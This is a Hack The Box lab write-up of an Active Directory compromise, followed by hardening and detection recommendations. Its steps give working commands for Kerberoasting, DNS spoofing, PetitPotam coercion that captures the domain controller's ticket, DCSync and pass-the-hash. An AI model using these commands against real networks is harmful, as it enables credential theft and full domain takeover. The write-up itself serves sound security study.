---
title: "Breach — Kerberoasting and Unconstrained Delegation to Domain Administrator"
description: "A guest-readable logon script and excessive directory permissions lead through Kerberos delegation abuse to domain compromise."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - kerberos
  - delegation
objective: "Escalate from a guest-readable NETLOGON logon script to domain administrator control by abusing an over-permissive ACL and unconstrained delegation."
tools:
  - rustscan
  - netexec
  - rusthound-ce
  - bloodyad
  - hashcat
  - impacket
  - krbrelayx
  - petitpotam
  - evil-winrm
skill: "Active Directory delegation abuse and credential-chain analysis"
outcome: "Domain administrator access via domain controller TGT capture, DCSync, and pass-the-hash"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Active Directory domain (`<DOMAIN>`) with the domain controller as the target host |
| Starting position | Unauthenticated network access; guest SMB access to readable shares |
| Objective | Escalate from a guest-readable NETLOGON logon script to domain administrator control by abusing an over-permissive ACL and unconstrained delegation |
| Outcome | Domain administrator access via domain controller TGT capture, DCSync, and pass-the-hash |

## Delegation abuse from a guest-readable script

Breach is a Medium-rated Hack The Box Windows Active Directory lab. A guest-readable NETLOGON logon script exposes a cleartext credential, directory analysis shows that the recovered account holds `GenericWrite` over a second user, and the second account's delegation-administration group membership supports an unconstrained-delegation attack. The domain controller is coerced into authenticating to an attacker-controlled relay, its ticket-granting ticket is captured, and the captured ticket is replayed for directory replication and administrative access. Credentials, hashes, hostnames, and addresses are replaced with role-based placeholders; command syntax is preserved.

**Attack path:** **Guest-readable NETLOGON script → cleartext credential → `GenericWrite` → SPN manipulation and Kerberoasting → WinRM access → machine account trusted for unconstrained delegation → DNS spoof and authentication coercion → domain controller TGT capture → DCSync and pass-the-hash**

## Domain target, guest SMB start, and objective

- **Target:** a Windows Active Directory domain (`<DOMAIN>`) whose domain controller (`<DOMAIN_CONTROLLER_FQDN>`) hosts the directory, SMB, and remote-management services.
- **Starting position:** unauthenticated network access; guest SMB login is accepted and exposes domain-readable shares.
- **Objective:** move from a readable logon script to domain administrator control by following the directory's authorization edges and delegation configuration.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: NETLOGON credential to DCSync pass-the-hash

### 1. Service Enumeration

Observation: a full TCP scan of the target identified standard Active Directory services alongside MSSQL (1433) and RDP (3389).

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

Significance: the host exposes the directory and remote-management services used by the following stages, while MSSQL and RDP widen the surface beyond the path taken here.

Result: the target was confirmed as the domain controller for `<DOMAIN>`.

### 2. Credential Discovery in the NETLOGON Share

Observation: a guest SMB session can spider readable shares, and the NETLOGON share contains a batch logon script whose mapped-drive command embeds a cleartext credential.

```bash
nxc smb <TARGET_IP> -u 'Guest' -p '' -M spider_plus
```

Recovered script line:

```text
if %USERNAME%==<INITIAL_DOMAIN_USER> net use <DRIVE>: \\<FILE_SERVER>\<SHARE> /user:<FILE_SERVER_ACCOUNT> <CLEARTEXT_PASSWORD>
```

Significance: a domain-readable logon script stores a reusable credential in cleartext, and guest access means no authentication is needed to retrieve it.

Result: the `<INITIAL_DOMAIN_USER>` credential pair was recovered and subsequently validated through LDAP authentication during directory collection.

### 3. Directory Analysis — GenericWrite Edge

Observation: collecting directory data with `rusthound-ce` and analysing it in BloodHound shows `<INITIAL_DOMAIN_USER>` holds `GenericWrite` over `<DELEGATION_USER>`.

```bash
rusthound-ce -d '<DOMAIN>' -u '<INITIAL_DOMAIN_USER>@<DOMAIN>' -p '<CLEARTEXT_PASSWORD>' -z
```

```text
<INITIAL_DOMAIN_USER> --GenericWrite--> <DELEGATION_USER>
```

Significance: `GenericWrite` over a user object lets the principal write an arbitrary `servicePrincipalName`, making the account Kerberoastable without any password-reset rights.

Result: directory analysis confirmed that `<INITIAL_DOMAIN_USER>` can modify the `<DELEGATION_USER>` object.

### 4. SPN Abuse and Kerberoasting

Observation: the `GenericWrite` edge permits writing a `servicePrincipalName` onto `<DELEGATION_USER>`, after which a Kerberos service ticket can be requested and cracked offline.

```bash
bloodyAD -d "<DOMAIN>" --host "<DOMAIN_CONTROLLER_FQDN>" \
  -u "<INITIAL_DOMAIN_USER>" -p "<CLEARTEXT_PASSWORD>" \
  set object "<DELEGATION_USER>" servicePrincipalName -v "http/<TEMPORARY_SPN>"

nxc ldap <DOMAIN_CONTROLLER_FQDN> -d "<DOMAIN>" \
  -u "<INITIAL_DOMAIN_USER>" -p "<CLEARTEXT_PASSWORD>" \
  --kerberoasting kerberoast.txt
```

```bash
hashcat -m 13100 kerberoast.txt <WORDLIST>
```

Recovered password:

```text
<KERBEROASTED_PASSWORD>
```

Significance: an SPN written through `GenericWrite` turns a normal user account into a Kerberoastable service identity, and the resulting service ticket is cracked offline with no further interaction against the target.

Result: the `<DELEGATION_USER>` password was recovered from the offline crack.

### 5. WinRM Access as the Recovered Account

Observation: the recovered `<DELEGATION_USER>` password is also valid for WinRM, the remote-management service used in a later stage.

```bash
evil-winrm -i <DOMAIN_CONTROLLER_FQDN> -u <DELEGATION_USER> -p '<KERBEROASTED_PASSWORD>'
```

Significance: an offline-cracked service password converts into interactive remote access on the domain controller.

Result: authentication as `<DELEGATION_USER>` succeeded over WinRM, yielding user-level access.

### 6. Unconstrained Delegation and Domain Controller Ticket Capture

Observation: `<DELEGATION_USER>` belongs to a delegation-administration group, which permits creating a machine account and marking it trusted for delegation.

```bash
impacket-addcomputer <DOMAIN>/<DELEGATION_USER>:<KERBEROASTED_PASSWORD> \
  -computer-name '<RELAY_MACHINE_ACCOUNT>' -dc-ip <TARGET_IP>

bloodyAD -d <DOMAIN> --dc-ip <TARGET_IP> \
  -u <DELEGATION_USER> -p '<KERBEROASTED_PASSWORD>' \
  add uac '<RELAY_MACHINE_ACCOUNT>$' -f TRUSTED_FOR_DELEGATION
```

DNS and SPN manipulation then direct the domain controller's authentication toward the attacker-controlled relay:

```bash
python3 dnstool.py -u '<DOMAIN>\<DELEGATION_USER>' -p '<KERBEROASTED_PASSWORD>' \
  -r <RELAY_FQDN> -d <ATTACKER_IP> --action add <TARGET_IP>

python3 addspn.py -u '<DOMAIN>\<DELEGATION_USER>' -p '<KERBEROASTED_PASSWORD>' \
  -s 'cifs/<RELAY_HOST>' -t '<RELAY_MACHINE_ACCOUNT>$' -dc-ip <TARGET_IP> <TARGET_IP>
```

Authentication coercion forces the domain controller to authenticate to the relay, where the delegation setting captures its ticket:

```bash
python3 PetitPotam.py -target-ip <TARGET_IP> \
  -u '<RELAY_MACHINE_ACCOUNT>$' -p '<RELAY_PASSWORD>' <RELAY_HOST> <DOMAIN_CONTROLLER_FQDN>
```

```text
[*] Got ticket for <DOMAIN_CONTROLLER_MACHINE>@<DOMAIN> [krbtgt@<DOMAIN>]
```

Significance: unconstrained delegation makes the relay collect the TGT of any principal that authenticates to it; spoofed DNS plus authentication coercion forces the domain controller to connect, capturing a reusable TGT for the controller machine account.

Result: the domain controller's TGT was captured in a credential cache file and carried forward to replication.

### 7. DCSync and Administrative Access

Observation: the captured domain controller TGT permits directory replication, so stored credential material can be extracted without a service exploit.

```bash
KRB5CCNAME='<DOMAIN_CONTROLLER_CCACHE>' \
  impacket-secretsdump -just-dc-user <DOMAIN_ADMINISTRATOR> -k <DOMAIN_CONTROLLER_FQDN>
```

```bash
evil-winrm -i <TARGET_IP> -u <DOMAIN_ADMINISTRATOR> -H <ADMIN_NT_HASH>
```

Significance: DCSync with the captured ticket yields the domain administrator's NT hash, and a pass-the-hash session converts that hash into administrative access without cracking it.

Result: the recovered NT hash authenticated over WinRM in the administrator context, completing domain administrator access.

## Challenges and Decisions

No failed attempts, blockers, or mid-chain corrections are recorded for this chain; each stage completed and supplied the input for the next.

## Outcome: controller TGT capture and DCSync access

The evidence establishes domain administrator access on the target domain controller: the captured controller TGT supported directory replication, and the recovered NT hash yielded an administrative WinRM session. Limitation: apart from the logon-script line, the BloodHound relationship edge, the ticket-capture line, and the cracked-password excerpt, the interactive WinRM stages are recorded as results rather than captured transcripts.

## Recommendations: NETLOGON secrets, write ACLs, delegation, and coercion

The actions below are recommendations; none was validated in the lab.

1. **Cleartext credentials in a NETLOGON logon script.** A domain-readable script stored a reusable password. *Impact:* an unauthenticated guest recovered a working domain credential. *Recommendation:* remove credentials from logon scripts and use managed identities or a credential vault, and restrict who can write to NETLOGON. *Detection:* alert on guest or anonymous SMB reads of NETLOGON and on credential-shaped strings in script files.
2. **Over-permissive object control (`GenericWrite`).** A standard user held write rights over another user object. *Impact:* an arbitrary `servicePrincipalName` could be written, enabling Kerberoasting of the target account. *Recommendation:* audit and remove non-essential write ACLs on user objects and enforce least privilege. *Detection:* alert on `servicePrincipalName` writes to user objects by non-administrative principals.
3. **Unconstrained delegation.** A machine account could be marked trusted for unconstrained delegation, and delegated principals accumulated reusable tickets. *Impact:* once coercion forced the domain controller to authenticate to the relay, its TGT was captured. *Recommendation:* eliminate unconstrained delegation and replace it with constrained or resource-based constrained delegation scoped to specific services.
4. **Authentication-coercion exposure (PetitPotam).** The domain controller could be coerced into authenticating to an attacker-chosen host. *Impact:* the forced authentication delivered the domain controller's TGT to the relay. *Recommendation:* apply current vendor hardening for authentication-coercion techniques, enable Extended Protection for Authentication on LDAP, block outbound NTLM from domain controllers, and disable unnecessary remote interface access.

## References

- [Hack The Box — Breach](https://app.hackthebox.com/machines/Breach) (retired machine)
- [KB5005413 — Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS) — Microsoft Support](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) (Microsoft mitigation guidance for PetitPotam authentication coercion)
- [NVD — CVE-2021-36942](https://nvd.nist.gov/vuln/detail/CVE-2021-36942) (Windows LSA spoofing, the vulnerability associated with PetitPotam authentication coercion)
- [Kerberos Constrained Delegation Overview — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview) (constrained and resource-based delegation as the replacement for unconstrained delegation)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and LDAP operations, including Kerberoasting)
- [RustHound-CE](https://github.com/g0h4n/RustHound-CE) (BloodHound-compatible Active Directory collector)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD) (directory object attribute and ACL manipulation)
- [Impacket](https://github.com/fortra/impacket) (machine-account creation and DCSync via `secretsdump`)
- [KrbRelayX](https://github.com/dirkjanm/krbrelayx) (`dnstool.py` and `addspn.py`)
- [PetitPotam](https://github.com/topotam/PetitPotam) (authentication coercion)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM sessions and pass-the-hash)
- [Hashcat](https://hashcat.net/hashcat/) (offline Kerberos ticket cracking)
- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner)
